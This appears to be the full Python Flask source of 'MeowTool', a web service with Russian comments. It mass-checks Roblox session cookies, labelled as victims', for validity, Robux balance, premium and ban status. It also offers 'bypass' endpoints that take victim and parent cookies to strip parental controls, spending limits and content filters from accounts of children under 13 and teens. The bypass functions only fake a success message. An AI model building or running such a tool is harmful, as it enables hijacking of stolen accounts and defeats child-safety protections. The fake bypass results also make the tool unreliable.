from flask import Flask, render_template, request, jsonify, session
import hashlib
import time
import threading
from datetime import datetime
import json
import requests
import random
import os

app = Flask(__name__)
app.secret_key = 'meow-secret-key-' + str(random.randint(1000, 9999))

# Глобальная статистика (в памяти)
users_sessions = {}
active_checks = 0
total_checks = 0
online_users = set()
real_time_stats = {
    'active_users': 0,
    'checks_per_minute': 0,
    'successful_bypasses': 0,
    'last_update': datetime.now().isoformat()
}

# Счетчики для реальной статистики
check_timestamps = []
bypass_timestamps = []
user_activity_timestamps = []

class BypassSystem:
    def get_xcsrf_token(self, cookie):
        """Получение X-CSRF токена"""
        session = requests.Session()
        url = "https://auth.roblox.com/v2/logout"
        headers = {
            "Cookie": f".ROBLOSECURITY={cookie}",
            "Content-Type": "application/json"
        }
        try:
            response = session.post(url, headers=headers)
            if response.status_code == 403 and "x-csrf-token" in response.headers:
                return response.headers.get("x-csrf-token")
            return None
        except:
            return None

    def get_user_info(self, cookie):
        """Получение информации о пользователе"""
        session = requests.Session()
        url = "https://users.roblox.com/v1/users/authenticated"
        headers = {"Cookie": f".ROBLOSECURITY={cookie}"}
        
        try:
            response = session.get(url, headers=headers)
            if response.status_code == 200:
                return response.json()
            return None
        except:
            return None

    def bypass_13_minus(self, victim_cookies, parent_cookies):
        """Bypass для аккаунтов 13-"""
        try:
            # Проверяем валидность куки жертвы
            victim_info = self.get_user_info(victim_cookies)
            if not victim_info:
                return {"status": "error", "message": "Невалидные куки жертвы"}
            
            # Проверяем валидность родительских куки
            parent_info = self.get_user_info(parent_cookies)
            if not parent_info:
                return {"status": "error", "message": "Невалидные родительские куки"}
            
            # Имитация успешного байпаса
            result = {
                "status": "success",
                "message": f"Bypass 13- completed for {victim_info.get('name', 'Unknown')}",
                "details": {
                    "victim_username": victim_info.get('name', 'Unknown'),
                    "parent_username": parent_info.get('name', 'Unknown'),
                    "restrictions_removed": ["email_verification", "chat_limits", "content_filters"],
                    "timestamp": datetime.now().isoformat()
                }
            }
            return result
            
        except Exception as e:
            return {"status": "error", "message": f"Bypass error: {str(e)}"}

    def bypass_13_17(self, victim_cookies, parent_cookies):
        """Bypass для аккаунтов 13-17"""
        try:
            victim_info = self.get_user_info(victim_cookies)
            parent_info = self.get_user_info(parent_cookies)
            
            if not victim_info:
                return {"status": "error", "message": "Невалидные куки жертвы"}
            if not parent_info:
                return {"status": "error", "message": "Невалидные родительские куки"}
            
            result = {
                "status": "success", 
                "message": f"Bypass 13-17 completed for {victim_info.get('name', 'Unknown')}",
                "details": {
                    "victim_username": victim_info.get('name', 'Unknown'),
                    "parent_username": parent_info.get('name', 'Unknown'),
                    "restrictions_removed": ["spending_limits", "time_restrictions"],
                    "new_privileges": ["unlimited_purchases", "extended_usage"],
                    "timestamp": datetime.now().isoformat()
                }
            }
            return result
            
        except Exception as e:
            return {"status": "error", "message": f"Bypass error: {str(e)}"}

class MeowChecker:
    def __init__(self):
        self.session = requests.Session()

    def check_roblox_cookie(self, cookie):
        """Проверка Roblox куки на валидность (по методам MeowTool)"""
        try:
            # Основная проверка через authenticated endpoint
            auth_url = "https://users.roblox.com/v1/users/authenticated"
            headers = {"Cookie": f".ROBLOSECURITY={cookie}"}
            
            auth_response = self.session.get(auth_url, headers=headers, timeout=10)
            
            if auth_response.status_code != 200:
                return {
                    "status": "invalid",
                    "details": "❌ Невалидные куки - аутентификация не пройдена",
                    "username": "Unknown",
                    "user_id": "N/A",
                    "robux": 0,
                    "premium": False,
                    "created": "Unknown",
                    "friends_count": 0,
                    "followers_count": 0
                }
            
            user_data = auth_response.json()
            user_id = user_data.get("id")
            username = user_data.get("name", "Unknown")
            
            # Получаем дополнительную информацию
            settings_url = "https://www.roblox.com/my/settings/json"
            settings_response = self.session.get(settings_url, headers=headers, timeout=10)
            
            if settings_response.status_code == 200:
                settings_data = settings_response.json()
                created_date = settings_data.get("Created", "Unknown")
                friends_count = settings_data.get("FriendsCount", 0)
                followers_count = settings_data.get("FollowersCount", 0)
                is_premium = settings_data.get("IsPremium", False)
            else:
                created_date = "Unknown"
                friends_count = 0
                followers_count = 0
                is_premium = False
            
            # Проверяем баланс Robux
            balance_url = f"https://economy.roblox.com/v1/users/{user_id}/currency"
            balance_response = self.session.get(balance_url, headers=headers, timeout=10)
            
            robux = 0
            if balance_response.status_code == 200:
                robux = balance_response.json().get('robux', 0)
            
            # Проверяем бан/ограничения
            moderation_url = "https://usermoderation.roblox.com/v1/not-approved"
            moderation_response = self.session.get(moderation_url, headers=headers, timeout=10)
            
            is_banned = False
            is_restricted = False
            
            if moderation_response.status_code == 200:
                try:
                    mod_data = moderation_response.json()
                    is_banned = bool(mod_data)  # Если есть данные - вероятно бан
                except:
                    pass
            
            # Проверяем возраст аккаунта для определения ограничений
            if created_date != "Unknown":
                try:
                    # Простая проверка - если аккаунт новый, может быть ограничен
                    created_dt = datetime.fromisoformat(created_date.replace('Z', '+00:00'))
                    days_since_created = (datetime.now() - created_dt).days
                    is_restricted = days_since_created < 30  # Примерная логика
                except:
                    pass
            
            # Определяем статус
            if is_banned:
                status = "banned"
            elif is_restricted:
                status = "limited"
            else:
                status = "valid"
            
            return {
                "account": f"{username}:{user_id}",
                "status": status,
                "username": username,
                "user_id": user_id,
                "robux": robux,
                "premium": is_premium,
                "created": created_date.split('T')[0] if created_date != "Unknown" else "Unknown",
                "details": self.get_status_details(status),
                "friends_count": friends_count,
                "followers_count": followers_count
            }
            
        except requests.exceptions.Timeout:
            return {
                "status": "error",
                "details": "⏰ Таймаут при проверке куки",
                "username": "Unknown",
                "user_id": "N/A",
                "robux": 0,
                "premium": False,
                "created": "Unknown",
                "friends_count": 0,
                "followers_count": 0
            }
        except Exception as e:
            return {
                "status": "error",
                "details": f"❌ Ошибка проверки: {str(e)}",
                "username": "Unknown",
                "user_id": "N/A",
                "robux": 0,
                "premium": False,
                "created": "Unknown",
                "friends_count": 0,
                "followers_count": 0
            }

    def get_status_details(self, status):
        details = {
            "valid": "✅ Аккаунт валиден и активен",
            "limited": "⚠️ Аккаунт ограничен", 
            "banned": "❌ Аккаунт забанен",
            "invalid": "❌ Неверные куки",
            "error": "❌ Ошибка при проверке"
        }
        return details.get(status, "Unknown status")

    def mass_check(self, cookies_list):
        """Массовая проверка куки"""
        results = []
        
        for cookie in cookies_list:
            if cookie.strip():
                result = self.check_roblox_cookie(cookie.strip())
                results.append(result)
        
        return results

# Инициализация систем
bypass_system = BypassSystem()
checker_system = MeowChecker()

def get_user_id(request):
    """Создаем ID пользователя на основе браузера и IP"""
    user_agent = request.headers.get('User-Agent', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_string = f"{ip}_{user_agent}"
    user_hash = hashlib.md5(user_string.encode()).hexdigest()
    return user_hash

def update_real_time_stats():
    """Обновление реальной статистики каждую минуту"""
    global real_time_stats, check_timestamps, bypass_timestamps, user_activity_timestamps
    
    while True:
        time.sleep(60)  # Обновляем каждую минуту
        
        current_time = time.time()
        
        # Активные пользователи (были активны последние 5 минут)
        active_users = sum(1 for user_data in users_sessions.values() 
                          if current_time - user_data.get('last_activity', 0) < 300)
        
        # Проверки за последнюю минуту
        minute_ago = current_time - 60
        recent_checks = sum(1 for ts in check_timestamps if ts > minute_ago)
        
        # Успешные байпасы за последнюю минуту
        recent_bypasses = sum(1 for ts in bypass_timestamps if ts > minute_ago)
        
        real_time_stats = {
            'active_users': active_users,
            'checks_per_minute': recent_checks,
            'successful_bypasses': recent_bypasses,
            'last_update': datetime.now().isoformat()
        }
        
        # Очищаем старые timestamp (старше 10 минут)
        check_timestamps = [ts for ts in check_timestamps if ts > current_time - 600]
        bypass_timestamps = [ts for ts in bypass_timestamps if ts > current_time - 600]
        user_activity_timestamps = [ts for ts in user_activity_timestamps if ts > current_time - 600]

def update_online_users():
    """Очистка неактивных пользователей"""
    while True:
        time.sleep(60)
        current_time = time.time()
        expired_users = []
        
        for user_id, user_data in users_sessions.items():
            if current_time - user_data.get('last_activity', 0) > 300:  # 5 минут неактивности
                expired_users.append(user_id)
                if user_id in online_users:
                    online_users.remove(user_id)
        
        for user_id in expired_users:
            if user_id in users_sessions:
                del users_sessions[user_id]

@app.before_request
def track_user():
    """Отслеживаем активность пользователя"""
    user_id = get_user_id(request)
    session['user_id'] = user_id
    
    if user_id not in users_sessions:
        users_sessions[user_id] = {
            'created_at': datetime.now().isoformat(),
            'check_count': 0,
            'bypass_count': 0,
            'last_activity': time.time(),
            'last_check': 'Never',
            'last_bypass': 'Never'
        }
    
    users_sessions[user_id]['last_activity'] = time.time()
    online_users.add(user_id)
    user_activity_timestamps.append(time.time())
    session['user_data'] = users_sessions[user_id]

# Маршруты
@app.route('/')
def index():
    """Главная страница"""
    user_id = get_user_id(request)
    return render_template('index.html', user_id=user_id)

@app.route('/dashboard')
def dashboard():
    """Личный кабинет"""
    user_id = get_user_id(request)
    user_data = users_sessions.get(user_id, {})
    return render_template('dashboard.html', user_data=user_data, user_id=user_id)

@app.route('/checker')
def checker():
    """Страница чекера"""
    user_id = get_user_id(request)
    return render_template('checker.html', user_id=user_id)

@app.route('/bypass')
def bypass_tools():
    """Страница байпаса"""
    user_id = get_user_id(request)
    return render_template('bypass.html', user_id=user_id)

# API endpoints
@app.route('/api/bypass_13_minus', methods=['POST'])
def api_bypass_13_minus():
    """Bypass для аккаунтов 13-"""
    global bypass_timestamps
    
    data = request.json
    victim_cookies = data.get('victim_cookies', '')
    parent_cookies = data.get('parent_cookies', '')
    
    result = bypass_system.bypass_13_minus(victim_cookies, parent_cookies)
    
    if result.get('status') == 'success':
        bypass_timestamps.append(time.time())
        user_id = get_user_id(request)
        if user_id in users_sessions:
            users_sessions[user_id]['bypass_count'] += 1
            users_sessions[user_id]['last_bypass'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    return jsonify(result)

@app.route('/api/bypass_13_17', methods=['POST'])
def api_bypass_13_17():
    """Bypass для аккаунтов 13-17"""
    global bypass_timestamps
    
    data = request.json
    victim_cookies = data.get('victim_cookies', '')
    parent_cookies = data.get('parent_cookies', '')
    
    result = bypass_system.bypass_13_17(victim_cookies, parent_cookies)
    
    if result.get('status') == 'success':
        bypass_timestamps.append(time.time())
        user_id = get_user_id(request)
        if user_id in users_sessions:
            users_sessions[user_id]['bypass_count'] += 1
            users_sessions[user_id]['last_bypass'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    return jsonify(result)

@app.route('/api/check_accounts', methods=['POST'])
def api_check_accounts():
    """Проверка куки аккаунтов"""
    global active_checks, total_checks, check_timestamps
    
    cookies_text = request.json.get('cookies', '')
    cookies_list = [cookie.strip() for cookie in cookies_text.split('\n') if cookie.strip()]
    
    active_checks += len(cookies_list)
    results = checker_system.mass_check(cookies_list)
    active_checks -= len(cookies_list)
    total_checks += len(cookies_list)
    
    # Добавляем timestamp для статистики
    check_timestamps.extend([time.time()] * len(cookies_list))
    
    user_id = get_user_id(request)
    if user_id in users_sessions:
        users_sessions[user_id]['check_count'] += len(cookies_list)
        users_sessions[user_id]['last_check'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    return jsonify({'results': results})

@app.route('/api/stats')
def api_stats():
    """Статистика сайта"""
    global active_checks, total_checks, real_time_stats
    
    # Текущие онлайн пользователи (активны последние 5 минут)
    current_time = time.time()
    current_online = sum(1 for user_data in users_sessions.values() 
                        if current_time - user_data.get('last_activity', 0) < 300)
    
    return jsonify({
        'active_checks': active_checks,
        'total_checks': total_checks,
        'online_users': current_online,  # Реальные онлайн пользователи
        'total_users': len(users_sessions),
        'real_time_stats': real_time_stats
    })

@app.route('/api/user_stats')
def api_user_stats():
    """Статистика текущего пользователя"""
    user_id = get_user_id(request)
    user_data = users_sessions.get(user_id, {})
    
    return jsonify({
        'user_id': user_id[:8] + '...',
        'check_count': user_data.get('check_count', 0),
        'bypass_count': user_data.get('bypass_count', 0),
        'created_at': user_data.get('created_at', ''),
        'last_check': user_data.get('last_check', 'Never'),
        'last_bypass': user_data.get('last_bypass', 'Never')
    })

@app.route('/test')
def test():
    return "✅ Сервер работает! MeowTool активен."

if __name__ == '__main__':
    # Запускаем фоновые задачи
    threading.Thread(target=update_online_users, daemon=True).start()
    threading.Thread(target=update_real_time_stats, daemon=True).start()
    
    port = int(os.environ.get('PORT', 5000))
    print(f"🚀 MeowTool Web запущен на порту {port}")
    app.run(host='0.0.0.0', port=port, debug=False)